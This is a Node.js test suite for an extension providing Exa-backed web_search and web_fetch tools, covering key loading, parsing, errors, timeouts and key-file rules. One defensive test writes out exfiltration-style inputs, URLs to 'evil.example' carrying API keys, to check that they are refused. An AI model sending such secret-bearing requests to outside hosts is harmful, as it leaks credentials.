// Drives the Pi extension against a fake registration object and a stubbed
// fetch.
//
//   node --test tests/pi-extension.test.mjs
//
// EXTENSION names the extension source, with its @SYNTHETIC_KEY_FILE@,
// @EXA_KEY_FILE@, and @OPENROUTER_KEY_FILE@ placeholders still in place; it
// defaults to the repository copy. Each load writes a copy with the placeholders pointing at fake key
// files under a temporary directory and imports it fresh, because the
// extension takes EXA_API_KEY out of process.env when it loads.
//
// KEY_HELPER names scripts/pi-provider-key, with its @KEY_VAR@ and @KEY_FILE@
// placeholders in place; it defaults to the repository copy. The key-file
// table runs against both packaged helper shapes and the extension, so a rule
// that drifts in either source turns this red.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync } from "node:fs";
import { chmod, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { afterEach, beforeEach, test } from "node:test";
import { pathToFileURL } from "node:url";

const sourcePath =
  process.env.EXTENSION ?? new URL("../packages/pi-extension/index.js", import.meta.url).pathname;
const source = await readFile(sourcePath, "utf8");
const helperPath =
  process.env.KEY_HELPER ?? new URL("../scripts/pi-provider-key", import.meta.url).pathname;
const helperSource = await readFile(helperPath, "utf8");
const helpers = [
  ["pi-synthetic-key", "SYNTHETIC_API_KEY"],
  ["pi-openrouter-key", "OPENROUTER_API_KEY"],
];

const EXA_KEY = "fake-exa-key-0123456789";
const SYNTHETIC_KEY = "fake-synthetic-key-0123456789";
const OPENROUTER_KEY = "fake-openrouter-key-0123456789";
const EXPORTED = Symbol.for("nix-config.pi-extension.exaApiKey");

let dir;
let loads = 0;
let requests;
let respond;
const realFetch = globalThis.fetch;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "pi-extension-"));
  requests = [];
  respond = () => Response.json({ results: [] });
  globalThis.fetch = async (url, init) => {
    requests.push({ url: String(url), init, body: JSON.parse(init.body) });
    return respond();
  };
  delete process.env.EXA_API_KEY;
  delete process.env.SYNTHETIC_API_KEY;
  delete process.env.OPENROUTER_API_KEY;
  delete globalThis[EXPORTED];
});

afterEach(async () => {
  globalThis.fetch = realFetch;
  await rm(dir, { recursive: true, force: true });
});

const exaKeyFile = () => join(dir, "exa_api_key");
const syntheticKeyFile = () => join(dir, "synthetic_api_key");
const openrouterKeyFile = () => join(dir, "openrouter_api_key");

const writeKeys = async ({ exa = EXA_KEY, synthetic = SYNTHETIC_KEY, openrouter = OPENROUTER_KEY } = {}) => {
  if (exa !== null) await writeFile(exaKeyFile(), `${exa}\n`);
  if (synthetic !== null) await writeFile(syntheticKeyFile(), `${synthetic}\n`);
  if (openrouter !== null) await writeFile(openrouterKeyFile(), `${openrouter}\n`);
};

// Imports a fresh copy and registers it on a fake `pi`. `thinkingLevel` is
// what pi.getThinkingLevel() returns.
async function load({ thinkingLevel = "high" } = {}) {
  const file = join(dir, `extension-${loads++}.mjs`);
  await writeFile(
    file,
    source
      .replace('"@SYNTHETIC_KEY_FILE@"', JSON.stringify(syntheticKeyFile()))
      .replace('"@EXA_KEY_FILE@"', JSON.stringify(exaKeyFile()))
      .replace('"@OPENROUTER_KEY_FILE@"', JSON.stringify(openrouterKeyFile())),
  );
  const extension = (await import(pathToFileURL(file).href)).default;
  const tools = new Map();
  extension({
    registerTool: (tool) => tools.set(tool.name, tool),
    getThinkingLevel: () => thinkingLevel,
  });
  return {
    tools,
    call: (name, params, ctx = {}, signal = undefined) =>
      tools.get(name).execute("call_1", params, signal, undefined, ctx),
  };
}

const textOf = (result) => result.content.map((part) => part.text).join("");

test("the source holds each placeholder once", () => {
  for (const placeholder of ['"@SYNTHETIC_KEY_FILE@"', '"@EXA_KEY_FILE@"', '"@OPENROUTER_KEY_FILE@"']) {
    assert.equal(source.split(placeholder).length, 2, placeholder);
  }
});

test("all three tools register with plain JSON Schema parameters", async () => {
  await writeKeys();
  const { tools } = await load();
  assert.deepEqual([...tools.keys()].sort(), ["session_info", "web_fetch", "web_search"]);
  for (const tool of tools.values()) {
    assert.equal(tool.parameters.type, "object");
    assert.equal(typeof tool.label, "string");
    assert.equal(typeof tool.description, "string");
    assert.equal(typeof tool.execute, "function");
  }
});

test("web_search posts to /search with the key, type auto, 5 results, and highlights", async () => {
  await writeKeys();
  respond = () =>
    Response.json({
      results: [
        { url: "https://example.com/a", title: "A", highlights: ["first passage", "second passage"] },
        { url: "https://example.com/b", title: "B", highlights: ["third passage"] },
      ],
    });
  const { call } = await load();
  const result = await call("web_search", { query: "nix flakes" });
  assert.equal(requests.length, 1);
  const [request] = requests;
  assert.equal(request.url, "https://api.exa.ai/search");
  assert.equal(request.init.method, "POST");
  assert.equal(request.init.headers["x-api-key"], EXA_KEY);
  assert.equal(request.body.query, "nix flakes");
  assert.equal(request.body.type, "auto");
  assert.equal(request.body.numResults, 5);
  assert.ok(request.body.contents?.highlights, "contents.highlights must be requested");
  assert.notEqual(result.isError, true);
  assert.deepEqual(result.details.results, [
    { url: "https://example.com/a", title: "A", highlights: ["first passage", "second passage"] },
    { url: "https://example.com/b", title: "B", highlights: ["third passage"] },
  ]);
  const shown = textOf(result);
  for (const fragment of ["https://example.com/a", "A", "first passage", "second passage", "https://example.com/b", "third passage"]) {
    assert.ok(shown.includes(fragment), fragment);
  }
  assert.ok(shown.startsWith("Untrusted web content"), "search results must be labeled untrusted");
});

for (const [requested, sent] of [
  [50, 10],
  [10, 10],
  [0, 1],
  [-3, 1],
  [2.7, 2],
  [Number.NaN, 5],
  [Number.POSITIVE_INFINITY, 5],
  ["7", 5],
]) {
  test(`web_search sends numResults ${String(requested)} as ${sent}`, async () => {
    await writeKeys();
    const { call } = await load();
    await call("web_search", { query: "q", numResults: requested });
    assert.equal(requests[0].body.numResults, sent);
  });
}

test("malformed Exa entries map to empty strings and string-only highlights", async () => {
  await writeKeys();
  respond = () =>
    Response.json({
      results: [
        { url: 5, title: null, highlights: "not an array", text: 7 },
        { url: "https://example.com/b", title: { nested: true }, highlights: ["kept", 3, null, "also kept"], text: ["x"] },
        null,
        "a bare string",
      ],
    });
  const { call } = await load();
  const search = await call("web_search", { query: "q" });
  assert.notEqual(search.isError, true);
  assert.deepEqual(search.details.results, [
    { url: "", title: "", highlights: [] },
    { url: "https://example.com/b", title: "", highlights: ["kept", "also kept"] },
    { url: "", title: "", highlights: [] },
    { url: "", title: "", highlights: [] },
  ]);
  assert.ok(!textOf(search).includes("undefined") && !textOf(search).includes("[object Object]"));
  const fetched = await call("web_fetch", { urls: ["https://example.com/b"] });
  assert.notEqual(fetched.isError, true);
  assert.deepEqual(fetched.details.results, [
    { url: "", title: "", text: "" },
    { url: "https://example.com/b", title: "", text: "" },
    { url: "", title: "", text: "" },
    { url: "", title: "", text: "" },
  ]);
});

test("web_fetch posts the URLs to /contents with a text limit and returns each page's text", async () => {
  await writeKeys();
  respond = () =>
    Response.json({
      results: [
        { url: "https://example.com/a", title: "A", text: "page A text" },
        { url: "https://example.com/b", title: "B", text: "page B text" },
      ],
    });
  const { call } = await load();
  const result = await call("web_fetch", { urls: ["https://example.com/a", "https://example.com/b"] });
  assert.equal(requests.length, 1);
  const [request] = requests;
  assert.equal(request.url, "https://api.exa.ai/contents");
  assert.equal(request.init.headers["x-api-key"], EXA_KEY);
  assert.deepEqual(request.body.urls, ["https://example.com/a", "https://example.com/b"]);
  assert.ok(Number.isInteger(request.body.text?.maxCharacters) && request.body.text.maxCharacters > 0);
  assert.deepEqual(result.details.results, [
    { url: "https://example.com/a", title: "A", text: "page A text" },
    { url: "https://example.com/b", title: "B", text: "page B text" },
  ]);
  assert.equal(result.details.untrusted, true);
  const shown = textOf(result);
  assert.ok(shown.startsWith("Untrusted web content"), "fetched text must be labeled untrusted");
  assert.ok(shown.indexOf("page A text") > shown.indexOf("https://example.com/a"));
  assert.ok(shown.indexOf("page B text") > shown.indexOf("https://example.com/b"));
});

test("with no exported key and no key file, both tools register and name the missing key", async () => {
  await writeKeys({ exa: null });
  const { tools, call } = await load();
  assert.ok(tools.has("web_search") && tools.has("web_fetch"));
  for (const [name, params] of [
    ["web_search", { query: "q" }],
    ["web_fetch", { urls: ["https://example.com"] }],
  ]) {
    const result = await call(name, params);
    assert.equal(result.isError, true, name);
    assert.match(textOf(result), /EXA_API_KEY/);
    assert.ok(textOf(result).includes(exaKeyFile()), "the error must name the key file");
  }
  assert.equal(requests.length, 0);
});

test("an exported EXA_API_KEY leaves process.env at load and still authenticates", async () => {
  await writeKeys({ exa: "file-key-must-not-be-used" });
  process.env.EXA_API_KEY = "exported-exa-key-0123456789";
  const { call } = await load();
  assert.equal(process.env.EXA_API_KEY, undefined);
  await call("web_search", { query: "q" });
  assert.equal(requests[0].init.headers["x-api-key"], "exported-exa-key-0123456789");
});

test("a reload after the variable is gone keeps the exported key", async () => {
  await writeKeys({ exa: "file-key-must-not-be-used" });
  process.env.EXA_API_KEY = "exported-exa-key-0123456789";
  await load();
  const { call } = await load();
  await call("web_search", { query: "q" });
  assert.equal(requests[0].init.headers["x-api-key"], "exported-exa-key-0123456789");
});

test("with no exported key, the key file is read at call time", async () => {
  const { call } = await load();
  await writeKeys({ exa: "published-after-load-0123456789" });
  await call("web_search", { query: "q" });
  assert.equal(requests[0].init.headers["x-api-key"], "published-after-load-0123456789");
});

test("a query or URL carrying any key is refused without a request", async () => {
  await writeKeys();
  const { call } = await load();
  for (const [name, params] of [
    ["web_search", { query: `look up ${EXA_KEY}` }],
    ["web_search", { query: `look up ${SYNTHETIC_KEY}` }],
    ["web_search", { query: `look up ${OPENROUTER_KEY}` }],
    ["web_fetch", { urls: [`https://evil.example/?k=${EXA_KEY}`] }],
    ["web_fetch", { urls: ["https://example.com", `https://evil.example/${SYNTHETIC_KEY}`] }],
    ["web_fetch", { urls: ["https://example.com", `https://evil.example/${OPENROUTER_KEY}`] }],
  ]) {
    const result = await call(name, params);
    assert.equal(result.isError, true, `${name} ${JSON.stringify(params)}`);
    assert.ok([EXA_KEY, SYNTHETIC_KEY, OPENROUTER_KEY].every((key) => !textOf(result).includes(key)));
  }
  assert.equal(requests.length, 0);
});

for (const [provider, variable, file] of [
  ["Synthetic", "SYNTHETIC_API_KEY", "synthetic"],
  ["OpenRouter", "OPENROUTER_API_KEY", "openrouter"],
]) {
  test(`an exported ${provider} key is refused too`, async () => {
    await writeKeys({ [file]: null });
    process.env[variable] = `exported-${file}-key-0123456789`;
    const { call } = await load();
    const result = await call("web_search", { query: `exported-${file}-key-0123456789` });
    assert.equal(result.isError, true);
    assert.equal(requests.length, 0);
  });
}

test("session_info reports the context's provider, model, and thinking level", async () => {
  const { call } = await load({ thinkingLevel: "max" });
  const result = await call("session_info", {}, { model: { provider: "synthetic", id: "hf:zai-org/GLM-5.3" } });
  const report = JSON.parse(textOf(result));
  assert.deepEqual(report, {
    provider: "synthetic",
    model: "hf:zai-org/GLM-5.3",
    thinkingLevel: "max",
    error: null,
  });
  assert.deepEqual(result.details, report);
});

test("session_info reports an error when the context has no model", async () => {
  const { call } = await load({ thinkingLevel: "off" });
  const report = JSON.parse(textOf(await call("session_info", {}, {})));
  assert.equal(report.provider, null);
  assert.equal(report.model, null);
  assert.equal(report.thinkingLevel, "off");
  assert.equal(typeof report.error, "string");
  assert.ok(report.error.length > 0);
});

for (const status of [401, 429, 500]) {
  test(`an HTTP ${status} returns an error with the status and no key`, async () => {
    await writeKeys();
    respond = () => new Response(`echo ${EXA_KEY}`, { status });
    const { call } = await load();
    for (const [name, params] of [
      ["web_search", { query: "q" }],
      ["web_fetch", { urls: ["https://example.com"] }],
    ]) {
      const result = await call(name, params);
      assert.equal(result.isError, true);
      const shown = textOf(result) + JSON.stringify(result.details);
      assert.ok(shown.includes(String(status)), `${name} must carry ${status}`);
      assert.ok(!shown.includes(EXA_KEY) && !shown.includes(SYNTHETIC_KEY), `${name} must carry no key`);
    }
  });
}

test("a response without results returns an error instead of throwing", async () => {
  await writeKeys();
  respond = () => Response.json({ requestId: "r1" });
  const { call } = await load();
  for (const [name, params] of [
    ["web_search", { query: "q" }],
    ["web_fetch", { urls: ["https://example.com"] }],
  ]) {
    const result = await call(name, params);
    assert.equal(result.isError, true, name);
    assert.match(textOf(result), /results/);
  }
});

const bothTools = [
  ["web_search", { query: "q" }],
  ["web_fetch", { urls: ["https://example.com"] }],
];

// Asserts each tool fails with exactly `message` and carries neither key.
async function assertFailsWith(call, message) {
  for (const [name, params] of bothTools) {
    const result = await call(name, params);
    assert.equal(result.isError, true, name);
    assert.equal(textOf(result), `${name}: ${message}`);
    assert.deepEqual(result.details, { error: message });
    const shown = textOf(result) + JSON.stringify(result.details);
    assert.ok(!shown.includes(EXA_KEY) && !shown.includes(SYNTHETIC_KEY), `${name} must carry no key`);
  }
}

test("a fetch that throws an error carrying the key returns the generic failure", async () => {
  await writeKeys();
  globalThis.fetch = async () => {
    throw new Error(`socket closed ${EXA_KEY} ${SYNTHETIC_KEY}`);
  };
  const { call } = await load();
  await assertFailsWith(call, "the request to Exa failed");
});

test("a fetch rejected with an AbortError reports aborted", async () => {
  await writeKeys();
  globalThis.fetch = async () => {
    throw new DOMException(`aborted ${EXA_KEY}`, "AbortError");
  };
  const { call } = await load();
  await assertFailsWith(call, "aborted");
});

test("a 200 response whose body is not JSON returns the generic failure", async () => {
  await writeKeys();
  respond = () => new Response(`<html>${EXA_KEY}</html>`, { status: 200 });
  const { call } = await load();
  await assertFailsWith(call, "the request to Exa failed");
});

// A fetch that never answers, as a stalled connection does, and only gives
// up when its signal aborts, the way the real fetch does.
const stalledFetch = async (_url, init) =>
  new Promise((_resolve, reject) => {
    if (init.signal.aborted) reject(init.signal.reason);
    init.signal.addEventListener("abort", () => reject(init.signal.reason), { once: true });
  });

test("a fetch that never answers times out after 30 seconds", async () => {
  await writeKeys();
  globalThis.fetch = stalledFetch;
  // The timeout the extension asks for is recorded, then shortened so the
  // test does not wait 30 seconds.
  const realTimeout = AbortSignal.timeout;
  const asked = [];
  AbortSignal.timeout = (ms) => {
    asked.push(ms);
    return realTimeout.call(AbortSignal, 20);
  };
  try {
    const { call } = await load();
    await assertFailsWith(call, "timed out after 30 seconds");
  } finally {
    AbortSignal.timeout = realTimeout;
  }
  assert.deepEqual(asked, [30000, 30000]);
});

test("the caller's signal still aborts a stalled request, reported as aborted", async () => {
  await writeKeys();
  globalThis.fetch = stalledFetch;
  const { call } = await load();
  for (const [name, params] of bothTools) {
    const controller = new AbortController();
    const pending = call(name, params, {}, controller.signal);
    controller.abort();
    const result = await pending;
    assert.equal(result.isError, true, name);
    assert.equal(textOf(result), `${name}: aborted`);
  }
});

// --- key-file rules, shared with scripts/pi-provider-key

// Each case is a key file's exact contents and the key both copies must take
// from it, or null when the file holds no key.
const longest = "x".repeat(8192);
const keyFileCases = [
  ["a key", "fake-key-0123456789", "fake-key-0123456789"],
  ["a key and a trailing newline", "fake-key-0123456789\n", "fake-key-0123456789"],
  ["a key and trailing blanks", "fake-key-0123456789 \t\r\n\n", "fake-key-0123456789"],
  ["an 8192-character key", longest, longest],
  ["an 8192-character key and a newline", `${longest}\n`, longest],
  ["an empty file", "", null],
  ["only a newline", "\n", null],
  ["two lines", "fake-key\nsecond-line\n", null],
  ["a space", "fake key\n", null],
  ["a leading space", " fake-key\n", null],
  ["a tab", "fake\tkey\n", null],
  ["a control character", "fake\u0001key\n", null],
  ["a DEL character", "fake\u007fkey\n", null],
  ["an 8193-character key", "x".repeat(8193), null],
  ["a non-breaking space", "fake\u00a0key\n", null],
  ["a trailing non-breaking space", "fake-key\u00a0\n", null],
  ["a non-ASCII letter", "fake-k\u00e9y\n", null],
  ["a vertical tab and form feed at the end", "fake-key\v\f\n", "fake-key"],
];

// The helper runs with an empty environment, so bash is found here.
const bash = (process.env.PATH ?? "")
  .split(delimiter)
  .filter((entry) => entry.startsWith("/"))
  .map((entry) => join(entry, "bash"))
  .find((candidate) => existsSync(candidate));

for (const [label, contents, want] of keyFileCases) {
  test(`the extension and both key helpers agree on a key file holding ${label}`, async () => {
    await writeFile(exaKeyFile(), contents);
    await writeFile(syntheticKeyFile(), "fake-synthetic-key-0123456789\n");
    const { call } = await load();
    const result = await call("web_search", { query: "q" });
    if (want === null) {
      assert.equal(result.isError, true);
      assert.match(textOf(result), /no Exa API key/);
      assert.equal(requests.length, 0);
    } else {
      assert.notEqual(result.isError, true);
      assert.equal(requests.length, 1);
      assert.equal(requests[0].init.headers["x-api-key"], want);
    }

    assert.ok(bash, "bash must be on PATH to run the key helpers");
    for (const [name, keyVar] of helpers) {
      const helper = join(dir, name);
      await writeFile(
        helper,
        helperSource.replace("@KEY_VAR@", keyVar).replace("@KEY_FILE@", exaKeyFile()),
      );
      await chmod(helper, 0o755);
      // The caller's locale must not change the rule; glibc builds C.UTF-8 in.
      for (const env of [{}, { LC_ALL: "C.UTF-8" }]) {
        const run = spawnSync(bash, [helper], { env, encoding: "latin1" });
        assert.equal(run.status, 0, run.stderr);
        assert.equal(run.stderr, "");
        assert.equal(run.stdout, want ?? "", `${name} with ${JSON.stringify(env)}`);
      }
    }
  });
}
